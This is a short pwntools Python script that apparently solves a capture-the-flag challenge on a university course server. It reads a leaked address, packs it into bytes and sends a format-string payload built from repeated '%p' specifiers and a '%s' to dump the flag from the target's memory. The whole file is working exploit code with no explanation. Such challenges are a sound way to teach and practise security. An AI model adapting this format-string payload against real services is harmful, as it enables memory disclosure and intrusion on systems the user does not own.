from pwn import *

p=remote("cs412-ctf.epfl.ch", 10002)
text = p.recvline_contains("flag").decode("utf-8")
print(text)
address = text.index("0x")
address = text[address+2:address+10]



#print(address)

address_format = ""

for i in range(6,-1,-2):
	address_format += chr(int(address[i:i+2],16))
#print(address_format)

p.sendline(address_format+"%p|" * 6 + "%s")
line = p.recvline()[30:].decode("utf-8").split("|")


flag = line[len(line)-1]
print(flag[:len(flag)-1])
